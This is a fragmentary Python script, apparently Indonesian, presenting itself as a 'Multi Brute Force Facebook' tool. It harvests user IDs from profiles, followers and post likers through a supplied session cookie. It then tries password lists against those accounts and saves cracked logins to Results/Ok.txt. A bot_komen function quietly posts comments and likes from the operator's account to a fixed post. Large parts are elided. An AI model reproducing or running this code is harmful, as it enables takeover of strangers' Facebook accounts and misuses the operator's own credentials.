...
### BANNER OR LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Coded by Milan
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold red]        __  _________    ___    _   __
[bold red]       /  |/  /  _/ /   /   |  / | / /
[bold white]    / /|_/ // // /   / /| | /  |/ / 
[bold white]   / /  / // // /___/ ___ |/ /|  / 
[bold red]    /_/  /_/___/_____/_/  |_/_/ |_/  
[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 2.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        ...
        if 'name' in str(response) and 'id' in str(response):
            ...
            Console(width=50, style="bold hot_pink2").print(Panel("[italic red]Facebook Graph Access Failed, Possible Facebook Cookies Have Expired!", title="[bold hot_pink2]([bold blue]Token Invalid[bold hot_pink2])"));time.sleep(3.2);login_cookie()
### LOGIN USING COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Login Using Facebook Cookies
[bold green]2[bold white]. How to Get Facebook Cookies
[bold green]3[bold white]. Get out ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
        query = Console().input("[bold hot_pink2]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Please Enter[italic green] Cookie[italic white], Use Sacrifice To Login And Make Sure Not Affected [italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Notes) [bold green]<[bold yellow]<[bold red]<"))
...
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
            ...
            try:
                Console().print("[bold hot_pink2]   ╰─>[bold green] You will be redirected to Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold hot_pink2]   ╰─>[bold yellow] Exit Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold hot_pink2]   ╰─>[bold red] Unknown Options!", end='\r');time.sleep(3.6);login_cookie()
...
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Don't need to be replaced, just think of it as a sign of gratitude :V
        text = random.choice(
            ['Cool Babe 😎','Hello World!','Great Babe ☺️','I Love You ❤️','Hi Babe 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Don't Replace!
        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Don't Replace!
...
[bold green]2[bold white]. Crack User From Followers
[bold green]3[bold white]. Crack Users From Like Posts
[bold green]4[bold white]. Get out ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
    query = Console().input("[bold hot_pink2]   ╰─> ")
    if query == '1' or query == '01':
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Please Enter[italic green] Facebook Account ID[italic white], Use Commas For Mass Dumps, For Example :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Notes) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold hot_pink2]   ╰─> ")
            for z in userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            if len(Dump) < 50:
                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Number of Users Too Few!", end='\r');time.sleep(3.6);exit()
            else:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Number of Users :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Success Dumps) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '2' or query == '02':
        try:
            ...
            if len(Dump) < 50:
                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Too Few Users!", end='\r');time.sleep(3.6);exit()
            else:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Number of Users :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Success Dumps) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
        ...
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Please Enter Post ID, Use Commas For Bulk Dump, For example :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Note) [bold green]<[bold yellow]<[bold red]<"))
        ...
        try:
            os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold hot_pink2]   ╰─>[bold green] Exit Program!", end='\r');time.sleep(3.6);exit()
        except:exit()
    else:
        Console().print("[bold hot_pink2]   ╰─>[bold red] Unknown Options!", end='\r');time.sleep(3.6);daftar_menu()
### DUMP ###
class dump:
        ...
        try:
            with requests.Session() as r:
                ...
                if 'summary' in str(response) and 'name' in str(response):
                    ...
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Fail {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
        ...
        try:
            with requests.Session() as r:
                ...
                if 'id' in str(response) and 'name' in str(response):
                    ...
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Fail {postid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
...
class crack:
    ...
    def open_list(self):
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("""[bold white]Crack results[bold green] Ok[bold white] Saved In :[bold green] Results/Ok.txt
[bold white]Crack results[bold red] Cp[bold white] Saved In :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
            ...
            Console().print("\r[bold white][[bold green]Finished[bold white]]                           ");exit()
        except:exit()
    ### MAIN ###
    def main(self, total, email, password):
        try:
            for pws in password:
                ...
                with requests.Session() as r:
                    ...
                    try:
                        ...
                        Console().print("[bold hot_pink2]   ╰─>[bold red] There is an error!                    ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': 0,
            ...
            Console().print("[bold hot_pink2]   ╰─>[bold red] Error Connection!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
        except Exception as e:
